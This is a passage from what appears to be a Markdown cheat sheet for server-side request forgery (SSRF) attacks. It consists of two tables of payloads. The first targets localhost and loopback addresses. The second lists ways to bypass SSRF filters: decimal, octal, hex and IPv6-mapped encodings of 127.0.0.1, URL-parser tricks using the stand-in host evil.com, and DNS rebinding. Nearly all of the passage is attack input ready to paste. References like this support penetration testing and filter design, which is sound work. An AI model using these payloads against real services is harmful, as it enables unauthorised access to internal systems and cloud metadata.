## 2. Basic SSRF Payloads
| Payload | Purpose |
|---|---|
| `http://127.0.0.1/` | Localhost check |
| `http://localhost/` | Localhost check (alt) |
| `http://0.0.0.0/` | Localhost check (alt) |
| `http://[::1]/` | IPv6 localhost |
| `http://127.1/` | Shortened loopback |

---

## 3. IP Obfuscation / Filter Bypass Payloads
| Technique | Example |
|---|---|
| Decimal IP | `http://2130706433/` (= 127.0.0.1) |
| Octal IP | `http://0177.0.0.1/` |
| Hex IP | `http://0x7f.0x0.0x0.0x1/` |
| Mixed encoding | `http://0x7f000001/` |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` |
| URL with credentials | `http://evil.com@127.0.0.1/` |
| Fragment trick | `http://127.0.0.1#@evil.com/` |
| Subdomain trick | `http://127.0.0.1.evil.com/` |
| DNS rebinding | Domain resolves safe → rebinds to internal IP after TTL expiry |

